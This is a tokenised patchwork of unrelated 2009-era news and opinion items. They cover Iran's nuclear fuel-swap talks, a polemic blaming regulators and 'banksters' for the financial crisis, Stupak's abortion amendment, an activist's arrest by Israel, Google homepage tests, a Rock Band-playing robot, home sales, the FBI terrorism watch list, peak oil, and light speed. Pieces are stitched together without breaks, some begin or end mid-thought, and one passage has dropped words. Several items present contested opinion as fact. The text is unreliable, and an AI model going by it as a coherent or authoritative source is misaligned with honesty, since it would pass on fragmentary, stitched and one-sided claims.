With this date approaching , Iran ’s foreign minister , Manouchehr Mottaki , sent a letter to the International Atomic Energy Agency ( IAEA ) in June 2009 , asking for help in purchasing fuel , which would be allowed under the provisions of the NNPT but would require that international sanctions against Iran ’s nuclear programme be lifted .
On hearing of this request , the Obama administration decided on a strategy that would force Iran to divest itself of its stock of low - enriched uranium ( LEU ) , then estimated at 1,500 kilograms .
During a visit to Moscow in July 2009 , Gary Samore , President Obama ’s chief adviser on the Iranian issue , put forward a proposal that he had formulated with Bruce Reidel for the Brookings Institution in December 2008 ( 1 ) .
This would require Iran to send most of its stock of LEU to Russia to be enriched to 20 % , which would set Iran ’s nuclear programme back at least 12 months .
Then , just one week after agreeing to talks with the G5+1 ( the US , France , the UK , Russia and China + Germany ) , Tehran informed the IAEA that it was building a second uranium enrichment facility near Qom , in addition to the plant at Natanz .
The US , Britain and France denounced this action , suggesting that Iran had only informed the IAEA because it knew that western intelligence services were about to reveal the plant ’s existence .
Tehran said it had complied with the NNPT ’s time limits for informing the IAEA and insisted that the site was intended as a backup in the event of an Israeli air strike on the Natanz site , threats that Tel Aviv regularly makes and which Washington uses to exert pressure on Tehran .
( Samore has advocated making use of these threats in his arm - wrestling matches with Iran . )
And on 6 July 2009 , in an interview with ABC , Vice - President Joseph Biden declared : “ Israel can determine for itself , it ’s a sovereign nation , what ’s in their interest and what they decide to do relative to Iran . ”
Many observers saw this as a green light for an Israeli strike .
‘ Confidence - building measure ’
Whatever the truth may be , the revelations about the Qom site , which Iran allowed the IAEA inspectors to visit , encouraged the Obama administration to take a tough line at the G5+1 talks in Geneva on 1 October .
This resulted in a proposal that Iran should send 80 % of its LEU to Russia , after which it would go to France to be turned into fuel rods for the research reactor in Tehran .
Presented as a “ confidence - building measure ” , the offer was intended to deprive Iran of most of its uranium reserves immediately , for 12 months or so , which would delay any technological breakthrough .
Obama would have been able to claim an agreement as a diplomatic victory .
Washington suggested that this timeframe would allow the two sides to reach a broader agreement that would eliminate the possibility of Iran developing a bomb .
But the logic behind this offer was faulty : the US continues to deny Iran the right to enrich uranium ( which would allow it to develop nuclear weapons ) , yet Iran insists that its right to enrich uranium is not negotiable .
And the issue would have to be addressed again in a year ’s time , when Iran would once more have accumulated a large quantity of LEU .
Yet the Iranian negotiators did not reject the western proposal outright : they were under orders to be cooperative , to avoid a breakdown that might lead to fresh economic sanctions .
But then Assistant Secretary of State William Burns , the senior US representative in Geneva , told reporters that the secretary of Iran ’s Supreme National Security Council , Saeed Jalili , had agreed that Iran would send 1,200 kilograms of depleted uranium overseas .
An empty promise : an Iranian negotiator , who asked to remain anonymous , told Reuters on 16 October that Iran had not agreed to the western plan , or even to its premises .
Nor were the Iranian negotiators authorised to accept such a plan at the second round of talks scheduled for 19 - 21 October in Vienna , during a meeting of the IAEA .
The second round of talks revolved around a draft agreement prepared by the outgoing IAEA director general , Mohamed El Baradei , for 80 % of Iran ’s uranium stocks to be sent to Russia .
A French diplomat confided to the Washington Post that this proposal was “ not far ” from the West ’s ideal solution .
On 21 October , the final day of the talks , the media claimed that Iran had agreed to the El Baradei plan .
Iran ’s IAEA representative , Ali Asghar Soltanieh , said the draft was “ on the right track ” but that his country would have to study the text carefully .
El Baradei admitted it was necessary to wait for an answer from Tehran , where a public discussion swiftly began .
Cheaper to buy from abroad
The former nuclear negotiator Ali Larijani , who is now the speaker of the parliament , and Alaeddin Boroujerdi , head of the parliamentary committee on national security and foreign affairs , both insisted that it would be far cheaper for Iran to buy enriched uranium from abroad .
They also explained that producing the 116 kilograms required for the medical research reactor would only require 750 kilograms of depleted uranium , not 1,500 kilograms as stated in the agreement .
There were more fundamental objections .
Mir Hossein Mousavi , Mahmoud Ahmadinejad ’s rival in the June presidential elections and a principal opponent since then , said that , if the conditions demanded by the El Baradei plan were met , the efforts of thousands of scientists would “ go up in smoke ” .
Conservative parliamentarian Hesmatollah Falahatpisheh felt that any deal should be conditional on the lifting of economic sanctions , particularly those on raw uranium imports .
And Mohsen Rezai , the conservative secretary of the Expediency Discernment Council ( 2 ) , declared that Iran should retain 1,100 of its 1,500 kilograms of LEU .
Beyond their often violent differences , all Iran ’s political factions are against the western proposal .
They all believe that the El Baradei plan would deprive Iran of the leverage it has gained over the last few years .
Senior national security officials under the presidencies of Ali Akbar Rafsanjani ( 1989 - 97 ) , Mohammed Khatami ( 1997 -2005 ) and Ahmedinejad admit that the object of accumulating LEU was always to force the US to engage in serious and comprehensive talks on matters of common interest .
They point out that before the enrichment programme began , the US showed no interest in talks .
The accumulation of LEU put Iran in a stronger position to negotiate .
How could Iran give up this trump card without getting something in return ?
Larijani and Boroujerdi ’s positions have been widely misinterpreted as evidence of divisions within the Iranian leadership .
The New York Times suggested that the Obama administration had scored a political point by dividing Iran ’s political class .
But this analysis rests on the assumption that Ahmedinejad had accepted the El Baradei plan , when he was mainly concerned with preventing a breakdown in the negotiations .
Call for guarantees
Behind the scenes , a new consensus was being formed between the government and the opposition .
Mousavi ’s denunciation of the western plan came on 29 October , the same day that Iran published its counterproposal that the uranium should be sent abroad in batches , the second only being shipped when the first was returned .
The state news agency IRNA called the “ simultaneous exchange ” feature of the counterproposal a “ red line ” in the negotiating position , Iran fearing that any uranium it sent abroad would never be returned .
This matches Boroujerdi ’s insistence on 26 October that the LEU should be sent to Russia in batches and call for “ guarantees ” that it would be returned .
Ambassador Soltanieh confirmed , in an interview given to Press TV on 18 November , that Iran wanted a “ 100 % guarantee ” that the enriched uranium would be returned , pointing out that Iran had paid for fuel before the 1979 revolution .
But after the revolution it had received neither the fuel nor a refund .
Iran also insisted that part of the uranium for the medical research reactor should be obtained through commercial transactions .
Rafsanjani , a powerful opposition figure , suggests that Iran could enrich uranium to 20 % if the LEU sent abroad was not returned .
Although the Iranian counterproposal eliminated everything about the El Baradei plan that made it attractive to the Obama administration and its allies , the Iranian negotiators carefully avoided rejecting the plan outright .
They reportedly expressed a “ positive attitude ” and a willingness to discuss it further .
To avoid a breakdown in the talks , Ahmedinejad made yet another offer : to leave roughly a quarter of its LEU under IAEA seals on Iranian soil until the uranium for its medical research reactor is delivered .
But Obama ’s warning on 15 November that time for negotiations was running out suggests that a new cycle of sanctions is about to begin .
If the talks do break down , it will be because of the logic behind the proposals put forward by Washington .
Russia and China have been ambiguous in their support .
As Samore suggests , Washington wants an agreement that it can present as a diplomatic victory over Iran .
Samore believed that the administration would have done better to try a broader discussion that took account of Iran ’s political and economic interests .
In the end , the Obama administration seems to have adopted a position that makes it impossible to achieve an agreement acceptable to Tehran and move towards a global settlement with the US .
If this is the case , the US may have started down the long , dark corridor to confrontation .
April 28 , 2004 : A Disastrous Day for the American Economy
by Bill Sardi
Recently by Bill Sardi : Why Is All This Happening ?
It ’sthe War BetweenBankers
On April 28 , 2004 these five Americans pictured above , Paul Atkins , Cynthia Glassman , William H. Donaldson , Harvey J. Goldschmid and Roel C. Campos , all Securities Exchange Commission ( SEC ) commissioners , along with Christopher Cox , then Bush - appointed SEC Chairman , and Annette L. Nazareth , director of market regulation at the SEC , put into motion a relaxation of reserve requirements for five investment banks , an action which doomed the American economy .
These five Securities & Exchange Commission commissioners sealed the future fate of the American economy on that day in 2004 when they approved an appeal by five investment banks ( Goldman Sachs , Lehman Brothers , Merrill - Lynch , Bear Stearns and Morgan - Stanley ) to expand their reserve ratios — that is , take greater risks with the public ’s money .
This was done by consent of the regulators and their politically - appointed bosses during the Bush II administration .
( Would any of you now care to fund a Presidential library for the man who was in charge during this wholesale theft of your money ? )
Only one voice stood in opposition to this expansion of risk , a consultant who writes financial software for the securities industry , Leonard C. Bole .
The widening of reserve ratios by investment banks would be permitted with the prerequisite that advanced computer technology be employed to signal any downturn in the economy at an early point so a collapse of the economy could be corrected before it would occur .
Bole wrote a letter to the SEC that the computer models the SEC would now rely upon to provide information , in advance of any financial collapse , were flawed .
You can listen to the live testimony of these SEC commissioners and learn more about Mr. Bole ’s letter to the SEC at an online video report prepared by The New York Times .
The aftermath of expanded leverage and exorbitant bonuses
To better comprehend wayward modern banking practices , readers here would benefit from understanding how these expanded leverage ratios ( reserves of assets or cash in relation to amount of loans ) have been mischievously used .
The expanded leverage used by the bankers was then translated into huge bonuses for bankers and bank stock holders , which is described by Edmund Conway , economics editor for the online edition of The Telegraph ( UK ) .
Conway reveals some striking behind - the - scene facts about banking in the United Kingdom and elsewhere .
Digging into the UK’s Financial Stability Report , Conway finds Britain ’s banks would not have faced insolvency had they withheld a fifth of the bonuses and dividends to executives and stockholders over the past 8 years .
Generally this would n’t make much of an impact upon readers who have heard of overly - generous bonuses paid to bank executives , who probably imagine these bonuses to amount to a few extra million dollars .
Most people can’t dream just how much money bankers have personally made in recent years .
Between 2000 and 2008 had British banks trimmed 20 % of bonuses and dividends , it would have amounted to 75 billion ( $ 120 billion US ) , more than what was needed in bailout funds .
These bankers did n’t become millionaires — they became billionaires , misusing their depositors ’ money .
If you like this site , please help keep it going and growing .
Bankers threaten to pull up stakes
London bankers are alarmed over threats to limit their bonuses and have even gone to threatening they will take their banking business offshore if such restrictions are implemented .
Imagine their audacity in making such a statement .
They obviously know they hold their country by the throat in managing trillions of dollars of deposits and assets .
London bankers say they would crash their own country ’s economy as they depart for parts unknown .
British citizens should be angry over this threat .
The bankers would be taking citizens ’ money with them .
Bankers game their government
But this is n’t the most alarming debacle in recent times with British bankers .
What has come into the public ’s eye , via reporter Conway , is that the massive profits made by British bankers in recent years were fabricated by making riskier loans .
A report , ironically written by bankers Andy Haldane , the Bank of England ’s director for financial stability , along with Piergiorgio Alessandri , proclaims that British bankers , knowing that their government would bail them out , intentionally extended the gap between their balance sheets and the amount of money loaned out , knowing of the " implicit government guarantee of the financial system . "
In essence , says Haldane , the British bankers were " gaming the state " and looting their banks for personal gain .
Haldane calls this a " doom loop . "
Bragging of their monstrous bonuses , and now personally wealthier than some entire countries , these bankers faced no penalties for their reckless risk taking and even would gain more bonuses as their skills are in desperate need to unravel the current economic crisis .
This created a scenario of private gains but socialized losses , says Haldane .
British bankers could operate with great bravado — they were not personally responsible for any failures .
They took their bonuses off the top , even when their banks were financially going under water .
Fabricated earnings to generate bonuses
Yet even more disconcerting is that the massive profits British banks totaled up in recent years , which their haughty bankers took credit for engineering , were earned over the past century , not by actual performance , but expansion of leverage — widening that gap between deposits / assets and the amount loaned out .
Traditionally , banks would keep 10 % of depositors ’ cash in reserve , and 8 — 10 % of assets in reserve , a 10 - to - 1 reserve ratio or so .
But bankers employed 20 - to - 1 , 30 - to - 1 and even 50 - to - 1 reserve - to - loan ratios .
This might have all been dandy except , to expand their loan business , they relaxed residential real estate loan standards and accepted loans from people with marginal incomes , and they offered low introductory " teaser " interest rates , and even no - down payment terms .
The banksters were churning the loans to generate more and more bonuses .
Who cares if these loans go into foreclosure , by then the banksters would have run off with their bonuses and blamed the whole fiasco on imprudent loan applicants who fabricated income history and outstanding credit card debt information on their loan application ( so called liar ’s loans ) .
But the bankers allowed all this to happen .
Some home buyers were told just to fudge the numbers and everything would be OK .
The above chart shows the vast majority of historical bank profits have been made by expanding leverage ( risk ) with their depositors ’ money , not by any unusual skill performed by bankers .
Reporter Conway confronted Bank of England officials at the Bank ’s Christmas party over the point of excessive bonuses earned by expanding leverage , not by their skills , and " they laughed off such a suggestion . "
But it ’s all in print — such arrogance .
The following two charts shows US and UK banks also kept less and less capital on hand as they expanded their earnings to unprecedented levels .
Should bankers ’ bonuses be limited ?
Who is to begrudge anyone for legitimately striking it rich ?
There should be no limit to opportunity .
What right has government to restrict incomes in a selected profession ?
But here we have an example of taking the people ’s money , breaking from traditional banking practices , taking bigger risks to generate far greater profits , while bank depositors were offered low interest rates on the use of their banked money .
It is preposterous .
Where is the jail time ?
Heads should roll , except in countries like the U.S. where bankers lobby Congress and buy off regulators .
Banksters can now operate with impunity .
Why not usher in meaningful reforms rather than restrict bankers ’ bonuses ?
It sets a bad precedent .
Though frankly , American and British banks , for all intents and purposes , are nationalized today and bankers are , in essence , public employees .
Fudging the numbers
To add further understanding , there are prudent asset / reserve - to - loan ratios in addition to cash / reserve - to - loan ratios .
The banksters also fudged on these numbers as well .
The bankers over - appraised the value of their real estate holdings , mostly because they falsely created increased demand for home loans by relaxing loan requirements to prospective homeowners .
Greater ( false ) demand resulted in a temporary increase in the selling price of homes .
But when home loan mortgagees began to default on their monthly payments , the whole charade collapsed .
The value of these homes is believed to be at least 30 % less than they once sold for .
The banks are carrying the value of these real estate properties on their books at the highest selling price .
In essence , the banks are cooking their books .
The real mark - to - market value of these properties ( the banks assets ) is far less than reported in their quarterly reports .
Furthermore , many banks have taken non-performing loans off their books , furthering the pretense they are financially stable .
Banks asset - to - loan ratios are completely fabricated at the moment .
To mark the value of these properties down to their true market value would force these banks into insolvency , and place millions more homeowners into upside - down mortgages ( owe more than their property is worth ) .
Why not let the banks fail ?
The only reason why the banks are not forced to own - up to their financial responsibilities , to appraise their real estate assets at mark - to - market values , is that the whole banking system ( all 8400 U.S. banks ) would be insolvent , and there go all the deposits and life savings of American citizens down the drain !
So we " kick the can " as Gary North says , and live day - to - day rather than deal with the problem .
Furthermore , the Federal Deposit Insurance Corporation ( FDIC ) , which insures savings and deposit accounts , is also out of money and is tapping the Treasury Department for money that does not currently exist — it is being made electronically .
The banks have no reserves other than bailout funds , and the insurance agency for the banks is broke too !
No easy way out
So the unspoken thinking is , since the nation is technically broke , why not fix the problem by placing this unprecedented amount of debt on the public ’s collective credit card ?
This means adding to the national debt .
The only avenues out of this mess have been to borrow more money from foreigners , who are now reluctant to do so , or to create money out of thin air , which expands the money supply but also dilutes the value of existing money and threatens to spark hyper-inflation ( i.e. $ 5 loaf of bread ) .
We ’re talking Zimbabwe - type inflation here .
The banksters ’ improprieties have forced England into expansion of its national debt to cover bank losses of incredible proportion .
The amount of debt Britain faces can only be fathomed by a comparison with the U.S .
The U.S. , a nation of 300 million people and an economy that generates ~ $ 14 trillion in Gross Domestic Product ( GDP ) , has had to expand what it borrows from ~ $ 400 billion per year to ~ $ 1.5 trillion .
But Great Britain , with a population of only 61 million , and a GDP of ~ $ 2.65 trillion , now faces a staggering 1.5 trillion of additional debt to deal with its financial crisis , making its accumulated debt load ~ 2.3 trillion ( ~ $ 3.7 trillion US dollars ) !
Bottom line , trillions of US dollars and British pounds have evaporated from their respective economies .
How much are we worth , net , per person ?
So total it all up for us , would you ?
If all the personal incomes were balanced against all the debt , what would each person be worth , on a per capita basis ?
Credit Loan , a credit counseling company , has prepared a chart which provides an authoritative answer to that question .

Post , the latest from Bart Stupak , clearly under the loving spiritual guidance of his C Street family :
Rep. Bart Stupak ( D - Mich . ) is warning fellow Democrats not to mess with his restrictive anti-abortion amendment .
Pro-choice outrage was sparked by the inclusion of a provision in the House health care bill making it harder for private insurers to cover abortion .
President Obama himself suggested that the language disrupted the status quo and should be taken out of the final legislation .
Abortion rights supporters in Congress requested a meeting with the president next week to discuss the issue .
Now Stupak is saying he wo n't go easily .
" We won because [ the Democrats ] need us , " Stupak said .
" If they are going to summarily dismiss us by taking the pen to that language , there will be hell to pay .
I do n't say it as a threat , but if they double - cross us , there will be 40 people who wo n't vote with them the next time they need us -- and that could be the final version of this bill . "

Israel ’s campaign against Palestinian nonviolent grassroots activists is continuing .
The latest leader to be arrested is Jamal Juma ’.
Juma ’ has been the coordinator of the Palestinian Grassroots Anti-Apartheid Wall Campaign since 2002 .
His arrests follows those of Mohammad Othman , who had been promoting BDS in Europe , and Abdallah Abu Rahmah a leader of the weekly nonviolent protests against the wall in Bil ’in .
The Stop the Wall campaign describes his arrest this way :
Israeli security first summoned Juma ’ for interrogation at midnight of December 15 .
Hours later , they brought him back to his home .
Juma ’ was handcuffed while soldiers searched his house for two hours as his wife and three young children looked on helplessly .
The parting words of the soldiers were directed at his wife : she would only see her husband again through a prisoner exchange .
Since then , Juma ’ has been detained , and banned from speaking to a lawyer or his family , with no explanation for his arrest .
The campaign is also clear to point out that this is part of a concerted campaign which aims to " weaken Palestinian civil society and its influence on political decision making at national and international level . "
Ma’an News is reporting that Juma ’ has a court date set for Monday .

For the past few months , we 've been experimenting with homepage designs like this and have run several live tests on the site .
We do these live tests when we are making a change that we think may fundamentally affect how people use the site .
Initially , some of the experiment findings had us concerned , but one thing we have learned through our tests is not to judge the outcome too quickly .
All in all , we ran approximately 10 variants of the fade - in .
Some of the experiments hindered the user experience : for example , the variants of the homepage that hid the search buttons until after the fade performed the worst in terms of user happiness metrics .
Other variants of the experiment produced humorous outcomes when combined with our doodles — the barcode doodle combined with the fade was particularly ironic in its overstated minimalism .
However , in the end , the variant of the homepage we are launching today was positive or neutral on all key metrics , except one : time to first action .
At first , this worried us a bit : Google is all about getting you where you are going faster — how could we launch something that potentially slowed users down ?
Then , we realized : weusers to notice this change ... and it doestosomething ( though in this case , only milliseconds ! ) .
Our goal then became to understand whether or not over time the users began to use the homepage even more efficiently than the control group and , sure enough , that was the trend we observed .
Internally , a large number of Google employees have been using the new homepage .
They have come to really like it — it represents our focus on great search yet helps searchers efficiently access all of Google 's products .
Like the new supersized search box we launched several months ago , this change is one that is very noticeable at first , and then quickly becomes second nature .
We hope you like it !

Rock Band has been released on the iPhone , and even though its a lot of fun , I would rather have something play it for me .
Preferably a robot !
The light sensor sends data to an Arduino , which is waiting for a spike in the data .
The Arduino runs the sensor data through some averaging filters , and sets a threshold for on and off .
The iPhone touch screen is n’t like most PDAs .
It uses a capacitive touch screen .
I had some conductive foam laying around , its usually used for shipping sensitive electronics .
If I used something non conductive , like a plastic pen , the foam would do nothing to the screen .
My solution to this was to put thin copper wires into the foam ( I also used these wires to attach the foam to the servos ) …
Add all of the above together into a modified Pelican case , with a lot of hot glue ( non glittery ) and you have a robot that will gladly beat all your difficult songs , sit back and sip some fine tea .
Fair enough , but we’d be more interested if Bowers could create something similar to help alleviate the daily 9 to 5 .
Still , much props to Bowers for bringing his dream of a RockBand playing robot to life , and if there are any Simpsons fans out there , it ’s sort of reminiscent of the episode where Homer gets fat , starts working from home , and has one of those bobbing plastic toys do his data entry job .

Sales of new homes in the US dropped 11.3 % to an annualized rate of 355 k units in November .
The consensus was for a rise of 2.3 % . to 438,000 from 430,000 a month earlier .
This is a really ugly number , far lower than the anticipated decline .
It comes on the news of a 30 K downward revision to 400k units annualized in October .
New home sales are down 9.0 % compared to November of last year when the annualized sales pace stood at 390k .
That right : new home sales are worse than they were at the height of the financial crisis .
Some additional data points :
From Tom Petruno : Financial - meltdown commission sets first hearings
The panel set up by Congress to tell us why the financial - system meltdown happened -- i.e. , who and what to blame -- will hold its first hearings Jan. 13 and 14 in Washington .
...
Congress is expecting a final report from the 10 - member , bipartisan commission by Dec. 15 , 2010 .
“ Hindsight is a wonderful thing , ” said Timothy W. Long , the chief bank examiner for the Office of the Comptroller of the Currency .
“ At the height of the economic boom , to take an aggressive supervisory approach and tell people to stop lending is hard to do . ”
Maybe they will take suggestions and questions .
My first suggestion is they start by interviewing - in private - the field examiners at the Fed , FDIC , OCC and OTS .
There is no need to publicly embarrass any examiner .
The various Inspector General reports on bank failures would provide a starting point ( see Eric Dash 's article in the NY Times : Post - Mortems Reveal Obvious Risk at Banks ) .
Ask the examiners what they saw and when - according to the Inspector General 's reports , the field examiners were warning about lending problems in 2002 and 2003 .
Follow the trail .
Did this information generate warnings inside the organizations ?
If so , why was n't action taken ?
Was the action blocked by political appointees ?
And how would the proposed regulatory reform lead to a better outcome ?
And a quote from Eric Dash 's article :
If the lending was risky , telling them to stop was the regulators job .
How does reform fix this ?
The good news is Brooksley Born is on the commission , and I think she will do an excellent job .
Here is their website ( under construction ) :
Irish Minister for Foreign Affairs Michael Martin has told an Irish Government committee that his official request to visit Gaza was refused by the Israeli authorities .
" I just wanted to go in and see Gaza " said Minister Martin .
A spokesperson for the Israeli embassy said that Martin was " always welcome " to Israel .
However the spokesperson added : “ It is not the appropriate time to visit Gaza because of the Hamas terrorist regime that controls it .
This can pose a . . . security risk . "
It is not the first time a European Minister has being refused entry to Gaza .
Chairman of the Dáil Committee on European Affairs Bernard Durkan felt that the move by Israel to block a foreign minister from visiting Gaza was " totally intolerable " and that an Irish minister 's request " to assess a humanitarian situation is almost without precedent and is tantamount to censorship . "
Durkan also voiced his opposition to the blockade of Gaza , which is vehemently opposed by the Irish and Europeans alike .
“ The continuing blockade of Gaza by Israel is utterly unjustified . "
He also said Israel was " unwilling to let the outside world see the suffering which is going on . "
Minister Martin went on to outline his position on the Palestinian crisis and indicated that the " international community may need to reconsider what further pressure " it can exert on Israel to solve and bring about a " two - state settlement " .
He also said the humanitarian conditions in Gaza were " completely unacceptable " .
Israel was condemned in a recent Human Rights report in which they were accused of committing war crimes during the short Israeli incursion into Gaza in late 2008 and early 2009 .
Minister Martin has asked the Israeli government to provide " further clear evidence " that it was serious about bringing about peace in Palestine .
He fears Israel is more concerned with " managing what I fear could well escalate into a situation of incipient conflict . "

FBI has 400,000 people on terrorism “ watch list ”
By Peter Daniels
2 November 2009
Federal Bureau of Investigation Director Robert S. Mueller has told members of the Senate Judiciary Committee that the FBI ’s current terrorism “ watch list ” contains 400,000 unique names , with an average of 1,600 new individuals added each day .
According to the FBI , five percent of the individuals on this list are US citizens , and nine percent of the list overlaps with the government ’s “ no fly ” lists , which has frequently blocked people from airline travel for no legitimate reason .
The FBI ’s daily operations are extensive .
According to Mueller ’s report , in addition to adding 1,600 names , the agency asks for the removal of 600 names each day and modifies the records of 4,800 others .
This information was delivered to the Senate committee in September , and first publicly reported on Secrecy News ( www.fas.org/blog/secrecy) last week .
An article then appeared in the Washington Post this weekend .
Mueller ’s replies were supplied in response to concerns raised by Wisconsin Senator Russell Feingold over little - publicized shifts in the FBI ’s rules for intelligence gathering .
The threshold for opening new investigations was significantly lowered following the terrorist attacks of September 11 , 2001 , but in recent years additional modifications have set the stage for a dramatic escalation of domestic spy operations .
The details of the rule changes have not been openly discussed .
Last year , in the final months of the Bush Administration , the Justice Department approved new FBI guidelines that expanded its ability to open domestic intelligence operations .
The FBI implemented them with a detailed manual , the Domestic Investigations and Operations Guide , in December 2008 .
Only after a Freedom of Information
Act lawsuit filed by critics of the new rules was a heavily redacted copy of the new Guide released in late September of this year .
The Guide lowers the threshold enabling the FBI to begin an investigation of a potential security threat , according to the New York Times , one of the few media sources to report on the changes .
This change was explained and defended by the general counsel of the FBI , Valerie Caproni , who was quoted in the Times .
“ The FBI has been told that we need to determine who poses a threat to the national security — not simply to investigate persons who have come onto our radar screen . ”
According to the new rules , information gathering needs no particular factual justification .
The new FBI Guide says the basis “ cannot be arbitrary or groundless speculation , ” but the standard is “ difficult to define . ”
This language obviously produces a huge loophole through which the authorities can justify massive spying and infiltration .
Another rule change essentially permits the FBI to use racial or religious profiling .
Ethnicity or religion may now be used to trigger an investigation — as long as it is not the only factor .
This is a distinction without a difference , needless to say , since any additional excuse can be introduced in order to essentially rationalize the targeting of ethnic or religious groups .
The Guide specifically authorizes taking into account “ specific and relevant ethnic behaviour ” and to “ identify locations of concentrated ethnic communities . ”
One example was the action of the authorities after a Somali - American teenager from the US Midwest carried out a suicide bombing in Africa a year ago .
The FBI began spying on Somali communities in such cities as Seattle , Washington and Columbus , Ohio .
The president of Muslim Advocates , one of the groups that initiated the FOIA lawsuit against the federal government , accused the government of harassing Muslim - Americans .
“ We have seen even in recent months the revelation of the FBI going into mosques , ” said Farhana Khera , “ not where they have a specific reason to believe there is criminal activity , but as ‘ agent provocateurs ’ who are trying to incite young individuals to join a purported terror plot .
We think the FBI should be focused on following actual leads rather than putting entire communities under the microscope . ”
The kind of fishing expeditions described by Muslim Advocates can only be described as aimed at the fabrication of supposed plots which can then be used to further isolate Muslim and other immigrant communities while also laying the basis for draconian measures taken against the entire working class .
The FBI spokeswoman claimed that FBI infiltration , while permitted , cannot be used to sabotage the “ legitimate social or political agenda ” of the organization , or lead it “ into criminal activity that otherwise probably would not have occurred . ”
However , in a number of cases since the September 11 , 2001 attacks , this is exactly what has taken place .
Senator Feingold asked how many “ assessments ” had been undertaken under the loosened guidelines that were put in place in December 2008 .
According to the Washington Post , the FBI replied that “ the answer was ‘ sensitive ’ and would be provided only in classified form . ”
The latest shift on FBI guidelines illustrates the methods used by the capitalist state and the inherently fragile status of democratic rights under the present system .
Even when the government has been forced to retreat on such matters as FBI spying , this has only been temporary .
The attorney general guidelines for FBI investigations , for instance , began in 1976 , in the aftermath of the Vietnam War and the Watergate scandal , when a Congressional investigation headed by then - Senator Frank Church of Idaho uncovered evidence of decades of spying operations .
Even under these conditions , the Ford administration which had replaced the disgraced Richard Nixon was able to stop restrictions being written into law by issuing its own internal guidelines .
This is the origin of the current guidelines , which have been modified by subsequent administrations with little or no oversight .
After the September 11 attacks , Attorney General John Ashcroft greatly expanded the scope of domestic surveillance .
In 2008 , Attorney General Michael Mukasey continued this expansion .
As for Democratic Attorney General Eric Holder of the Obama Administration , he has no more intention of reversing the reactionary moves of his predecessors than does Obama himself on the Patriot Act and the whole panoply of attacks on democratic rights that have accelerated in the past decade .
A spokesman for Holder said he was monitoring the new guidelines “ to see how well they work . ”
Holder is also presiding over the continued operation of the Guantánamo prison whose closing was promised by the end of 2009 by Obama when he took office .
It was Holder who suggested some months ago that investigations would take place on the possible responsibilities of previous administration officials for torture and other war crimes .
Needless to say , no such investigation has taken place or is remotely on the horizon .

The race for the world 's remaining oil reserves could get very nasty .
Recently , Nigerian militants announced their determination to oppose the efforts of a major Chinese energy group to secure six billion barrels of crude reserves , comparing the potential new investors to " locusts " .
The Movement for the Emancipation of the Niger Delta told journalists that the record of Chinese companies in other African nations suggested " an entry into the oil industry in Nigeria will be a disaster for the oil - bearing communities " .
Whatever the facts , the end of the first decade of the twenty - first century is likely to be seen by future historians as the beginning of the final chapter of a unique , unrepeatable period in human development .
Even oil companies now see the Age of Oil in irreversible decline – even if that decline spans decades .
International oil companies ( IOCs ) increasingly accept that they must transform themselves completely – or expire – by mid-century .
Superficially , the so - called " super majors " appear to be in good health .
Fortune 's Global 500 list places the " big six " – Shell , ExxonMobil , BP , Chevron , Total , and ConocoPhillips – among the seven largest corporations in the world , as measured by 2008 revenues .
In third place , Wal - Mart stands alone as the only top seven company not dedicated to finding , extracting , processing , distributing and selling the liquid transportation fuels that drive the global economy , although few business models are as dependent on the ready availability of relatively cheap oil .
Worryingly for such companies , 2008 may prove to have been the high water mark for the global oil industry , with geological , geopolitical and climate - related pressures now creating new market dynamics .
The oil question is now , more than ever , a transport question .
Cheap and reliable supplies of transportation fuel are the very lifeblood of our globalised economy .
So it matters profoundly that we are entering an era in which oil supplies will be neither cheap nor reliable .
For the likes of Shell , BP , and ExxonMobil , whose rates of liquid hydrocarbon production peaked in 2002 , 2005 , and 2006 respectively , the current economic paradigm requires them to replace reserves .
Investors primarily value IOCs on this basis , as well as their ability to execute projects on time within budget .
A key problem for the IOCs is that petroleum - rich countries feel increasingly confident in the ability of their own national oil companies to steward their domestic resources .
So generous concessions once offered to IOCs in return for technical and managerial expertise are now deemed unnecessary .
The imperative to satisfy investor expectations fuels an increasingly risky growth strategy , which drives IOCs towards energy - intensive ( and potentially climate - destabilising ) unconventional oil substitutes , such as tar sands ( in Canada ) , gas - to - liquids ( in Qatar ) , and coal - to - liquids ( in China and elsewhere ) .
These pathways are not chosen as ideals : they are more or less reflexive responses to external market pressures .
Meanwhile , the uncomfortable fact is that our economies are addicted to liquid hydrocarbon transport fuels , the consumption of which creates a catalogue of negative side effects .
And we cannot hope to address this addiction by way of our " dealers " developing even more damaging derivatives of the same drug .
As if that were not enough , there is the hot topic of " peak oil " , defined as the point at which global oil production reaches a maximum rate , from where it steadily declines .
The basic principle is uncontroversial : production of a finite non-renewable resource cannot expand endlessly , and this has been demonstrated in practice at national level all over the world .
The heated debate centres on the point at which the peak in global oil production is likely to be reached .
" Early toppers " argue that the peak has already been passed , and that the world will never produce more than 85 million barrels per day .
By contrast , " late toppers " point to the huge scale of unconventional reserves – for example , Alberta 's tar sands resource is vast – that remain untapped , as well as the potential bounty locked away in frontier regions such as the Arctic Ocean , where global warming is opening up new areas for oil and gas exploration .
Unfortunately , what matters is not the absolute size of these unconventional and frontier resources , but the rate at which they can be developed and brought to market .
By definition , this is the " difficult " oil .
Production rates are determined by a series of significant financial , social , and environmental constraints that raise grave concerns for the viability of a global economic system made possible by liquid transport fuels .
At the same time , leaders of all the major economies finally acknowledge what scientists have long been warning : to avoid catastrophic climate - change impacts , the global average surface temperature increase must be limited to 2° Celsius compared with the pre-industrial era .
To stand any reasonable chance of avoiding a 2° Celsius rise , our best understanding of the climate change science suggests that global greenhouse - gas emissions must peak within the next five to 10 years , and then decline by more than 80 % on 1990 levels by 2050 .
Realistically , meeting this requirement will demand that we engineer a transition to a zero - carbon energy system by mid-century .
So what might a zero - carbon energy system look like ?
As well as dramatic improvements in the energy efficiency of buildings and appliances , and massive deployment of sustainable renewable energy technologies , we will no longer be allowed to burn fossil fuels without capturing and sequestering the carbon dioxide emissions .
This implies that we must restrict our use of fossil fuels to stationary facilities , such as power plants , where carbon capture and storage ( CCS ) is practical ( see " Outlook and obstacles for CCS " ) .
Strikingly , a zero - carbon energy system will also mean that no liquid hydrocarbon fuels , with the exception of biofuels , can be consumed in mobile applications such as transport .
This does not make pleasant reading for international oil companies .
Their core business today may be described as : digging geological carbon resources out of the ground , converting those resources into liquid fuels , then marketing those fuels to consumers who set them on fire in internal combustion engines to move around .
By 2050 , these activities will all be considered to be strikingly primitive .

Most people learn in physics class that light goes one speed : faster than anything else .
Because of its long , rich history , this 300 million meters per second is generally treated as an established fact .
In the last few decades , though , scientists have been playing around with light 's speed .
But , as that history noted , researchers have started playing around with exceptions , based on the premise that " nothing in normal space can go faster than light , but if you can do funny things to space , you can go faster than light . "
Conveniently , a recent review in Science delves into how light can be slowed down or sped up .
